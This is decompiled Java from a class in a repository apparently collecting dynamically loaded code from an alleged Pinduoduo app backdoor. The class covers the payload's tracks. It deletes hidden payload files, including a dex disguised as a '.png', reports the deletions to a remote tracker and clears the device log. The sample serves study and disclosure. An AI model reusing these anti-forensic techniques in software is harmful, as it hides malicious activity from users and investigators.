package com.google.android.sd.biz_dynamic_dex.oppo_proxy.server;

import android.content.Context;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import com.google.android.sd.biz_dynamic_dex.base.DynamicUtils;
import com.google.android.sd.biz_dynamic_dex.base.INotBizProcess;
import java.io.File;

public class ProguardUtils implements INotBizProcess {
  public static void deleteFileIfNeed(Context paramContext, boolean paramBoolean) {
    int i;
    /* monitor enter TypeReferenceDotClassExpression{ObjectType{com/google/android/sd/biz_dynamic_dex/oppo_proxy/server/ProguardUtils}} */
    if (paramBoolean) {
      i = 2;
    } else {
      i = 1;
    } 
    int j = i;
    try {
      File file = getStorageWorkDir();
      j = i;
      if (file.exists()) {
        j = i;
        DynamicUtils.deleteRecycle(file);
        j = i;
        if (!file.exists()) {
          j = i;
          RemoteTrackUtils.submit400TrackAsync(paramContext, i, true, "success");
        } else {
          j = i;
          RemoteTrackUtils.submit400TrackAsync(paramContext, i, false, "io fail");
        } 
      } 
      i += 10;
      j = i;
      file = getDexTmpFile(paramContext);
      j = i;
      if (file.exists()) {
        j = i;
        DynamicUtils.deleteRecycle(file);
        j = i;
        if (!file.exists()) {
          j = i;
          RemoteTrackUtils.submit400TrackAsync(paramContext, i, true, "success");
        } else {
          j = i;
          RemoteTrackUtils.submit400TrackAsync(paramContext, i, false, "io fail");
        } 
      } 
    } catch (Exception exception) {
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append("exception: ");
      stringBuilder.append(exception.getMessage());
      RemoteTrackUtils.submit400TrackAsync(paramContext, j, false, stringBuilder.toString());
    } finally {}
    /* monitor exit TypeReferenceDotClassExpression{ObjectType{com/google/android/sd/biz_dynamic_dex/oppo_proxy/server/ProguardUtils}} */
  }
  
  public static File getDexTmpFile(Context paramContext) {
    return new File(paramContext.getFilesDir(), "sdthdy_tmp.dex");
  }
  
  public static String getStorageDexName() {
    return "sdthdy.png";
  }
  
  public static File getStorageWorkDir() {
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.append(Environment.getExternalStorageDirectory());
    stringBuilder.append("/Documents");
    return new File(stringBuilder.toString(), ".iSpirit");
  }
  
  public static void proguardFile(final Context context, long paramLong) {
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.append("proguard_file_delay_start_");
    stringBuilder.append(context.getPackageName());
    RemoteTrackUtils.remoteLog(stringBuilder.toString());
    HandlerThread handlerThread = new HandlerThread("nevermore_proguard");
    handlerThread.start();
    (new Handler(handlerThread.getLooper())).postDelayed(new Runnable() {
          public void run() {
            try {
              StringBuilder stringBuilder = new StringBuilder();
              stringBuilder.append("proguard_file_delay_work_");
              stringBuilder.append(context.getPackageName());
              RemoteTrackUtils.remoteLog(stringBuilder.toString());
              ProguardUtils.deleteFileIfNeed(context, true);
              RemoteTrackUtils.commitRemoteLog(context);
              DynamicUtils.clearLogcat();
              return;
            } catch (Exception exception) {
              StringBuilder stringBuilder = new StringBuilder();
              stringBuilder.append("proguard_file_delay_err");
              stringBuilder.append(exception.getMessage());
              RemoteTrackUtils.remoteLog(stringBuilder.toString());
              return;
            } 
          }
        }paramLong);
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\75dcc8ea-d0f9-4222-b8dd-2a83444f9cd6-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\oppo_proxy\server\ProguardUtils.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */